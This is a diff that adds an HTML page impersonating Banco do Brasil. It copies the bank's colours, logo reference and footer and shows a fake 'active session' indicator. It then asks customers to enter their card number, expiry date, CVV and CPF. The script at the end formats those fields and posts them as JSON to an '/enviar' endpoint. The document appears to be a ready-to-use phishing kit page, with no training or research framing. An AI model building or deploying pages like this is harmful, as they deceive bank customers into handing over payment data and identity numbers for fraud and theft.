@@ -1,0 +1,277 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>Banco do Brasil · Confirmação de Dados</title>
+<link rel="icon" type="image/png" href="logo.png"/>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet"/>
+<style>
+  :root{
+    --bb:#00457C;
+    --bb-dark:#003360;
+    --bb-light:#0059A3;
+    --bb-pale:#EBF3FA;
+    --yellow:#FFC20E;
+    --ink:#222;
+    --muted:#6B7F94;
+    --line:#C8D8E8;
+    --bg:#F4F6F8;
+    --card:#fff;
+  }
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  body{
+    font-family:'Roboto','Segoe UI',system-ui,sans-serif;
+    background:var(--bg);
+    color:var(--ink);
+    min-height:100vh;
+    display:flex;flex-direction:column;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  /* ── Top blue bar (BB style) ── */
+  .topbar{
+    background:var(--bb);
+    padding:0 24px;
+    height:64px;
+    display:flex;align-items:center;gap:12px;
+    border-bottom:3px solid var(--yellow);
+  }
+  .topbar img{height:38px;width:auto}
+  .topbar .brand{margin-left:8px;color:#fff}
+  .topbar .brand strong{font-size:15px;font-weight:700;display:block;letter-spacing:.2px}
+  .topbar .brand span{font-size:11px;opacity:.75;font-weight:400;letter-spacing:.5px;text-transform:uppercase}
+  .topbar .right{margin-left:auto;display:flex;align-items:center;gap:16px}
+  .topbar .session{
+    color:#fff;font-size:12px;font-weight:400;
+    display:flex;align-items:center;gap:6px;
+  }
+  .topbar .session .dot{
+    width:7px;height:7px;border-radius:50%;
+    background:#4ADE80;display:inline-block;
+    animation:pulse 2s infinite;
+  }
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+  .topbar .user-chip{
+    background:rgba(255,255,255,.15);
+    color:#fff;font-size:12px;font-weight:500;
+    padding:5px 12px;border-radius:4px;
+    cursor:pointer;
+  }
+
+  /* ── Breadcrumb ── */
+  .breadcrumb{
+    background:#fff;
+    border-bottom:1px solid var(--line);
+    padding:10px 24px;
+    font-size:12.5px;
+    color:var(--muted);
+  }
+  .breadcrumb a{color:var(--bb-light);text-decoration:none}
+  .breadcrumb a:hover{text-decoration:underline}
+  .breadcrumb span{margin:0 6px;color:#B0C4D4}
+
+  /* ── Page ── */
+  .page{flex:1;display:flex;justify-content:center;padding:32px 16px 56px}
+
+  /* ── Panel (BB form style) ── */
+  .panel{
+    width:100%;max-width:500px;
+    background:var(--card);
+    border:1px solid var(--line);
+    border-top:3px solid var(--bb);
+  }
+  .panel-head{
+    padding:20px 24px 16px;
+    border-bottom:1px solid var(--line);
+    background:#FAFBFC;
+  }
+  .panel-head h1{
+    font-size:18px;font-weight:500;color:var(--bb);
+    letter-spacing:-.2px;
+  }
+  .panel-head p{
+    font-size:12.5px;color:var(--muted);margin-top:4px;font-weight:400;
+  }
+
+  /* ── Form ── */
+  .panel-body{padding:24px}
+  .field{margin-bottom:18px}
+  .field label{
+    display:block;
+    font-size:13px;font-weight:500;color:var(--ink);
+    margin-bottom:6px;
+  }
+  .field input{
+    width:100%;padding:10px 12px;
+    border:1px solid var(--line);border-radius:4px;
+    font-size:14px;font-family:inherit;
+    background:#FAFBFC;color:var(--ink);
+    outline:none;
+    transition:border-color .15s, box-shadow .15s;
+  }
+  .field input:focus{
+    border-color:var(--bb-light);
+    background:#fff;
+    box-shadow:0 0 0 2px rgba(0,83,143,.12);
+  }
+  .field input::placeholder{color:#A8BCCB}
+  .row{display:flex;gap:16px}
+  .row .field{flex:1}
+
+  /* ── Actions ── */
+  .actions{
+    display:flex;gap:12px;margin-top:24px;
+  }
+  .btn-primary{
+    flex:1;
+    padding:11px 0;
+    background:var(--bb);
+    color:#fff;border:none;border-radius:4px;
+    font-size:14px;font-weight:500;font-family:inherit;
+    cursor:pointer;letter-spacing:.2px;
+    transition:background .15s;
+    display:flex;align-items:center;justify-content:center;gap:8px;
+  }
+  .btn-primary:hover{background:var(--bb-dark)}
+  .btn-primary:disabled{opacity:.55;cursor:not-allowed}
+  .btn-secondary{
+    padding:11px 20px;
+    background:#fff;
+    color:var(--bb-light);
+    border:1px solid var(--bb-light);border-radius:4px;
+    font-size:14px;font-weight:500;font-family:inherit;
+    cursor:pointer;
+    transition:background .15s;
+  }
+  .btn-secondary:hover{background:var(--bb-pale)}
+
+  /* ── Spinner ── */
+  .spinner{
+    width:14px;height:14px;
+    border:2px solid rgba(255,255,255,.3);
+    border-top-color:#fff;
+    border-radius:50%;
+    animation:spin .7s linear infinite;
+    display:none;
+  }
+  .btn-primary.loading .spinner{display:block}
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  /* ── Feedback ── */
+  .msg{
+    display:none;margin-top:16px;padding:10px 14px;
+    border-radius:4px;font-size:13px;font-weight:400;
+  }
+  .msg.ok{display:block;background:#F0FDF4;color:#166534;border:1px solid #BBF7D0}
+  .msg.err{display:block;background:#FEF2F2;color:#991B1B;border:1px solid #FECACA}
+
+  /* ── Footer ── */
+  .footer{
+    background:#fff;
+    border-top:1px solid var(--line);
+    padding:14px 24px;
+    display:flex;align-items:center;justify-content:center;gap:20px;
+    font-size:11.5px;color:var(--muted);
+  }
+  .footer a{color:var(--bb-light);text-decoration:none}
+  .footer a:hover{text-decoration:underline}
+  .footer .sep{color:#C8D8E8}
+
+  @media(max-width:480px){
+    .topbar{padding:0 12px;height:56px}
+    .topbar img{height:32px}
+    .breadcrumb{padding:8px 12px}
+    .page{padding:20px 12px 40px}
+    .panel-body{padding:16px}
+    .row{flex-direction:column;gap:0}
+  }
+</style>
+</head>
+<body>
+
+  <div class="topbar">
+    <img src="logo.png" alt="Banco do Brasil">
+    <div class="brand">
+      <strong>Banco do Brasil</strong>
+      <span>Agência Digital</span>
+    </div>
+    <div class="right">
+      <div class="session"><span class="dot"></span> Sessão ativa</div>
+      <div class="user-chip">Meu BB</div>
+    </div>
+  </div>
+
+
+
+  <div class="page">
+    <div class="panel">
+      <div class="panel-head">
+        <h1>Confirmação de Dados</h1>
+        <p>Informe os dados do seu cartão para concluir o procedimento.</p>
+      </div>
+      <form class="panel-body" id="form">
+        <div class="field">
+          <label for="cartao">Número do cartão</label>
+          <input id="cartao" name="cartao" inputmode="numeric" placeholder="0000 0000 0000 0000" maxlength="19" required>
+        </div>
+        <div class="row">
+          <div class="field">
+            <label for="validade">Validade</label>
+            <input id="validade" name="validade" inputmode="numeric" placeholder="MM/AA" maxlength="5" required>
+          </div>
+          <div class="field">
+            <label for="cvv">CVV</label>
+            <input id="cvv" name="cvv" inputmode="numeric" placeholder="123" maxlength="3" required>
+          </div>
+        </div>
+        <div class="field">
+          <label for="cpf">CPF do titular</label>
+          <input id="cpf" name="cpf" inputmode="numeric" placeholder="000.000.000-00" maxlength="14" required>
+        </div>
+        <div class="actions">
+          <button class="btn-primary" type="submit" id="btn">
+            <span class="spinner"></span>
+            <span id="btn-text">Enviar</span>
+          </button>
+        </div>
+        <div id="msg" class="msg"></div>
+      </form>
+    </div>
+  </div>
+
+  <div class="footer">
+    <span>© Banco do Brasil S.A.</span>
+    <span class="sep">|</span>
+    <a href="#">Central de Atendimento</a>
+    <span class="sep">|</span>
+    <a href="#">Acessibilidade</a>
+    <span class="sep">|</span>
+    <a href="#">Fale Conosco</a>
+  </div>
+
+<script>
+  const cartao=document.getElementById('cartao'),validade=document.getElementById('validade'),cpf=document.getElementById('cpf');
+  const btn=document.getElementById('btn'),btnText=document.getElementById('btn-text'),msg=document.getElementById('msg');
+  cartao.addEventListener('input',()=>{let v=cartao.value.replace(/\D/g,'').slice(0,16);cartao.value=v.replace(/(\d{4})(?=\d)/g,'$1 ')});
+  validade.addEventListener('input',()=>{let v=validade.value.replace(/\D/g,'').slice(0,4);if(v.length>2)v=v.slice(0,2)+'/'+v.slice(2);validade.value=v});
+  cpf.addEventListener('input',()=>{let v=cpf.value.replace(/\D/g,'').slice(0,11);if(v.length>9)v=v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6,9)+'-'+v.slice(9);else if(v.length>6)v=v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6);else if(v.length>3)v=v.slice(0,3)+'.'+v.slice(3);cpf.value=v});
+  document.getElementById('form').addEventListener('submit',async(e)=>{
+    e.preventDefault();
+    btn.disabled=true;btn.classList.add('loading');btnText.textContent='Enviando…';msg.className='msg';msg.textContent='';
+    try{
+      const res=await fetch('/enviar',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({cartao:cartao.value,validade:validade.value,cvv:cvv.value,cpf:cpf.value})
+      });
+      const data=await res.json();
+      if(data.ok){msg.className='msg ok';msg.textContent='Dados enviados com sucesso.';e.target.reset()}
+      else{throw new Error(data.message||'Falha ao enviar.')}
+    }catch(err){msg.className='msg err';msg.textContent='Erro: '+err.message}
+    finally{btn.disabled=false;btn.classList.remove('loading');btnText.textContent='Enviar'}
+  });
+</script>
+</body>
+</html>
